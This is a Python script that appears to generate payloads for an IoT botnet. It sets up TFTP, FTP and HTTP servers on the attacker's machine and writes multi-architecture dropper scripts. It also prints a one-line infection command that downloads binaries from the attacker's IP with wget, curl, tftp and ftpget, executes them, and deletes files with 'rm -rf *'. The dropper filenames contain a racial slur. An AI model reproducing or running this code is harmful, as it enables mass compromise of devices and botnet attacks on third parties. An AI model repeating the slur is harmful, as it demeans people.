import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "76d32be0"
exec_name = "payload"
bin_prefix = "static"
bin_directory = "bins"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm",                        #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"spc",                        #12
"i686",                       #13
"sh4",                        #12
"arc"]                        #10

def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[01;37mPlease wait while your payload generating.")
print(" ")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/nigger.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/nigger.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/nigger.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/nigger2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/nigger2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/nigger2.sh')
run('echo "#!/bin/bash" > /var/www/html/nigger.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/nigger2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/nigger2.sh')
run('echo "#!/bin/bash" > /var/ftp/nigger1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/nigger1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/nigger1.sh')
run('echo "#!/bin/bash" > /var/www/html/76d32be0.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/www/html/nigger.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/ftp/nigger1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/nigger.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/nigger2.sh') 
    
run("service apache2 restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')

print("\x1b[0;31mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/nigger.sh; curl -O http://" + ip + "/nigger.sh; chmod 777 nigger.sh; sh nigger.sh; tftp " + ip + " -c get nigger.sh; chmod 777 nigger.sh; sh nigger.sh; tftp -r nigger2.sh -g " + ip + "; chmod 777 nigger2.sh; sh nigger2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " nigger1.sh nigger1.sh; sh nigger1.sh; rm -rf nigger.sh nigger.sh nigger2.sh nigger1.sh; rm -rf *\x1b[0m")
print("")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/nigger.sh; curl -O http://" + ip + "/nigger.sh; chmod 777 nigger.sh; sh nigger.sh; tftp " + ip + " -c get nigger.sh; chmod 777 nigger.sh; sh nigger.sh; tftp -r nigger2.sh -g " + ip + "; chmod 777 nigger2.sh; sh nigger2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " nigger1.sh nigger1.sh; sh nigger1.sh; rm -rf nigger.sh nigger.sh nigger2.sh nigger1.sh; rm -rf *")
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()
raw_input("\033[01;37mGenerated Payload In File (Payload.txt) Directory: /root\033[0m")
